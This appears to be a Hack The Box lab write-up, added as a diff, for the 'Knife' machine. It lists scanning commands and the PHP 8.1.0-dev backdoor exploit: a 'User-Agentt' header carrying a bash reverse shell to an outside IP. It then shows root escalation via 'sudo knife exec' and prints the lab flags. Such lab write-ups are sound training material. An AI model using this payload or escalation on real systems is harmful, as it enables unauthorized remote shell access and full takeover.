@@ -1,0 +1,59 @@
+Machine-Name : Knife
+IP-Address   : 10.129.221.19
+
+Command-Line: sudo nmap 10.129.221.19 -p- -A -T4 -o nmap/init.txt
+Result:
+    ./nmap/init.txt
+
+Command-Line: ./dirsearch.py -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt -e php -f -t 50 -i 200,201,202,301,302,403 -u http://10.129.221.19/ -o ~/HTB/Machines/Knife_NF/recon/recon-1.txt
+Result:
+    ./recon/recon-1.txt
+
+Browser: http://10.129.221.19/index.php
+Notes: Sent browser request to BurpSuite. In Repeater Response, found version of PHP being used.
+PHP-Version: PHP/8.1.0-dev
+Browser: PHP/8.1.0-dev
+URL: https://flast101.github.io/php-8.1.0-dev-backdoor-rce/
+Notes: Malicious code was implanted to the php github repo. "User-Agentt" with 2 t's and the value "zerodium<php-code>;" will execute commands on the target-system.
+BurpSuite: "User-Agentt": zerodiumsystem("bash -c 'bash -i >& /dev/tcp/10.10.14.99/9001 0>&1'")
+Result:
+    james@knife:/$
+    *** REVERSE SHELL ***
+    *** USER ACCESS ***
+
+james@knife:/$ cat /home/james/user.txt
+Result:
+    80143e3213c1e4551fd20c31e3fd718e
+    *** USER OWNED ***
+
+james@knife:/$ sudo -l
+Result:
+    Matching Defaults entries for james on knife:
+        env_reset, mail_badpass,
+        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+    User james may run the following commands on knife:
+        (root) NOPASSWD: /usr/bin/knife
+
+Browser: GTFOBins
+Search: Knife
+URL: https://gtfobins.github.io/gtfobins/knife/
+Result:
+    Sudo
+    "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
+    sudo knife exec -E 'exec "/bin/sh"'
+
+james@knife:/$ sudo knife exec -E 'exec "/bin/sh"'
+Result:
+    #
+    *** ROOT ACCESS ***
+
+# whoami
+Result:
+    root
+# cat /root/root.txt
+Result:
+    c423dd636b25af411efac102eaa947b3
+    *** ROOT OWNED ***
+
+      *** FINISHED ***
